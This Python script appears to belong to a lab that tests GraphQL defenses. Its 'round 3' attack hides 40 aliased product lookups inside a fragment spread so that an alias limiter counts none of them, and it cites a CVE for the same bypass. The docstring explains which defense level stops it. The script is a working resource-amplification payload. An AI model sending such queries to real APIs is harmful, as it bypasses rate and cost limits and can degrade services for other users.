"""
Round 3 attack: alias amplification through a fragment spread.

Round 2's alias limiter counts aliases on the operation's own selection set and does not follow fragment spreads.
So hide the aliases inside a fragment and spread it: the limiter sees one fragment spread (zero aliases) while the
server expands and resolves all of them. This is the shape of CVE-2026-47707, the alias-amplification bypass in
Strawberry's MaxAliasesLimiter, where the limiter failed to count how many times a fragment is resolved.

At DEFENSE_LEVEL=2 this bypasses the alias cap and runs at full cost. At level 3 the persisted-query allowlist
rejects it: the amplified query is not a trusted document the first-party client ever shipped, so it never runs
- and the fragment-aware counter would catch it even if it somehow were allowed.

    python attacks/round3_fragment_amp.py
"""

from _common import SCRIPT_UA, ApiApp, bot_ip, finish

ACTOR = "bot:r3_fragment"


def fragment_amp(n):
    aliases = " ".join(f"a{i}: product(id: {i + 1}) {{ id sku price stock }}" for i in range(n))
    return "query Amp { ...Big } fragment Big on Query { " + aliases + " }"


def run(n=40):
    app = ApiApp(ACTOR, bot_ip(2), ua=SCRIPT_UA)
    r = app.gql(fragment_amp(n), operation="Amp")
    body = r.json() if r.status_code == 200 else {}
    got = len(body.get("data") or {})
    return finish("round3_fragment_amp", n, got, "aliased products served", status=r.status_code,
                  resolver_cost=(body.get("extensions") or {}).get("cost", 0), verdict=app.client.verdict())


if __name__ == "__main__":
    run()
